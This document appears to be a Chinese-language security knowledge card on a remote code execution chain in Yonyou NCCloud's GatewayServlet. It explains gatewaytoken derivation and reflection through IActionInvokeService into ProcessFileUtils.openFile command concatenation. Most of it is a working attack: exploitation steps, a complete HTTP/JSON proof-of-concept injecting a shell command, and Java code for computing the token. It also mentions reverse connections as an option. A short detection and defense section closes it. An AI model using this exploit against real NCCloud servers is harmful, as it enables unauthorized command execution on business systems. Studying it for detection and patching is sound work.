---
id: web-java-component-yonyou-nccloud-gateway-reflection-command-injection
title: 用友 NCCloud GatewayServlet 反射调用 ProcessFileUtils 命令拼接 RCE
type: scenario
domain: web
path: web/java/component
technique: yonyou-nccloud-gateway-reflection-command-injection
aliases:
- 用友 NCCloud RCE
- NCCloudGatewayServlet
- gatewaytoken 校验
- IActionInvokeService exec
- ProcessFileUtils openFile
- ActionExecutor 反射调用
tags:
- java
- yonyou
- nccloud
- rce
- reflection
- command-injection
- gatewaytoken
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V13
  verified_at: '2026-11-05T01:20:39+08:00'
  notes: 已对照原文核对：/service/* 映射、gatewaytoken 校验逻辑、callNCService 参数赋值、NCLocator nameIndices 白名单、IActionInvokeService.exec→ActionExecutor→ProcessFileUtils.openFile 命令拼接与完整 JSON PoC、calc 复现截图均与原文/26 张图一致；未验证点：未在真实 NCCloud 实例复现，gatewaytoken 依赖配置泄露/默认值
---

## 一句话结论

用友 NCCloud 的 `/service/NCCloudGatewayServlet` 在通过 `gatewaytoken` 校验后，会把 JSON 中的 `serviceClassName`/`serviceMethodName`/参数交给 `NCLocator` 与反射调用；借助白名单内的 `IActionInvokeService.exec` 作为反射桥，再调用 `ProcessFileUtils.openFile`，把参数拼进 `cmd /c start` 命令行即可命令注入。

## 原理

- `web.xml` 把 `NCInvokerServlet` 映射到 `/service/*`；NCCloud 的 `ServletForGW.doAction()` 首先执行 `GateWayUtil.checkGateWayToken(request.getHeader("gatewaytoken"))`。
- 该校验把请求头与 `(new Encode()).decode(getProp().getProperty("nccloud.gateway.nctoken"))` 做字符串比较；token 本身来自配置文件 `nccloud.gateway.nctoken`，经过一个可复现的 `Encode.decode()` 变换。知道配置值即可算出请求头（配置泄露、源码/备份、默认值都可能提供）。
- 校验通过后，Servlet 用 `JsonParser` 解析请求体，读取 `serviceInfo.serviceClassName`、`serviceMethodName`、`serviceMethodArgInfo`，再 `NCLocator.getInstance().lookup(serviceClassName)` 获取服务实例。
- `NCLocator` 只允许 `nameIndices`/`metaMaps` 中登记的组件，所以不能直接把 `ProcessFileUtils` 当作 `serviceClassName`；但 `com.ufida.zior.console.IActionInvokeService` 是白名单内的服务，其 `exec(actionName, methodName, paramter)` 会调用 `ActionExecutor.exec`。
- `ActionExecutor.exec` 执行 `Class.forName(actionName).newInstance()`，再按方法名反射调用，等价于一个通用反射桥：只要 `actionName` 类在白名单/类路径中，就能调用其任意单参数方法。
- `nc.bs.pub.util.ProcessFileUtils.openFile(String filePath)` 在 Windows 分支执行：
  `Runtime.getRuntime().exec("cmd /c start \"\" \"" + filePath + "\"")`
  `filePath` 未转义；传入 `1.txt"|calc;"` 可闭合引号并用 `|` 追加命令，最终执行 `calc`。
- 整个链的入口只需要一个 HTTP JSON 请求，响应为 200 与 `{"agg":false}`，命令在服务端进程权限下执行。

## 触发条件

- 目标为存在该 Servlet 与 `IActionInvokeService`/`ProcessFileUtils` 的用友 NCCloud 版本，`/service/NCCloudGatewayServlet`（或 `/service/*`）可从攻击者网络访问。
- 能获得或推导 `gatewaytoken`：配置文件 `nccloud.gateway.nctoken` 泄露、源码/备份可读、默认值未改，或可在本地复现 `Encode.decode` 计算出请求头。
- `nc.bs.pub.util.ProcessFileUtils` 在类路径中且可被 `ActionExecutor` 反射实例化/调用。
- 目标为 Windows 时命中 `cmd /c start` 分支；Linux 分支是 `xdg-open`，注入面不同。

## 利用步骤

1. 访问 `/service/NCCloudGatewayServlet`，确认路由存在与响应特征。
2. 从配置/源码获取 `nccloud.gateway.nctoken`，用 `new Encode().decode(value)` 算出实际 token；或直接复用已泄露的 token。
3. 构造 `serviceInfo`：`serviceClassName` 用白名单内的 `com.ufida.zior.console.IActionInvokeService`，`serviceMethodName` 用 `exec`。
4. 三个 String 参数依次为：目标类 `nc.bs.pub.util.ProcessFileUtils`、方法 `openFile`、注入串 `1.txt"|calc;"`。
5. 带上 `gatewaytoken` 头发送 JSON；观察 200 响应与服务端命令执行（如弹出计算器、回连、写文件）。

## PoC

```http
POST /service/NCCloudGatewayServlet HTTP/1.1
Host: target
gatewaytoken: <decode(nccloud.gateway.nctoken) 的结果>
Content-Type: application/json

{"serviceInfo":{"serviceClassName":"com.ufida.zior.console.IActionInvokeService","serviceMethodName":"exec","serviceMethodArgInfo":[{"agg":false,"isArray":false,"isPrimitive":true,"argType":{"body":"java.lang.String"},"argValue":{"body":"nc.bs.pub.util.ProcessFileUtils"}},{"agg":false,"isArray":false,"isPrimitive":true,"argType":{"body":"java.lang.String"},"argValue":{"body":"openFile"}},{"agg":false,"isArray":false,"isPrimitive":true,"argType":{"body":"java.lang.String"},"argValue":{"body":"1.txt\"|calc;\""}}]}}
```

本地计算 token 的思路：

```java
String nctoken = (new Encode()).decode(
    getProp().getProperty("nccloud.gateway.nctoken"));
System.out.println(nctoken);
```

响应示例：HTTP 200，body `{"agg":false}`；服务端执行 `cmd /c start "" "1.txt"|calc;"`。

## 变体与关联

- 反射目标变体：凡是 `IActionInvokeService.exec` 能 `Class.forName(...).newInstance()` 且存在可被单参数反射调用的危险方法的类，都可作为 sink；本文用 `ProcessFileUtils.openFile` 的命令拼接。
- 入口变体：`/service/*` 下其他 NCInvokerServlet 路由也可能复用同一 JSON 调度与 token 校验逻辑。
- 文件上传变体：原文提到 `nc.itf.hr.tools.IFileTrans` 也在 `nameIndices` 名单内，可通过反射调用其上传方法实现任意文件上传，但未给出完整方法名与 PoC，本卡不展开。
- 关联：[[web-java-rce-processimpl-constructor-reflect-exec]]（Java 反射/进程创建原语）；[[web-java-component-syncope-connector-script-rce]]（同类 Java 组件反射/脚本 RCE）。
- 边界：`gatewaytoken` 无法获得且无默认值、目标已修复/移除反射桥、`ProcessFileUtils` 不在类路径、非 Windows 分支时，本链不成立或需换 sink。

## 检测与防御

- 检测：`/service/*` 请求体出现 `serviceMethodArgInfo`、`IActionInvokeService`、`ProcessFileUtils`、`openFile`；参数中出现 `|`、`&`、`"` 等命令拼接字符；同一来源短时间内探测 `NCCloudGatewayServlet`；服务端出现 `cmd /c start` 子进程。
- 防御：升级到修复版本/应用官方补丁；限制 `/service/*` 仅对可信来源开放；轮换并妥善保管 `nccloud.gateway.nctoken`，不要把可解码 token 放在可读配置中；移除或收敛 `IActionInvokeService` 这类通用反射桥，改为显式白名单方法；WAF 拦截危险服务名/参数特征只能作为补充；以低权限运行 NC 服务，限制其创建子进程。
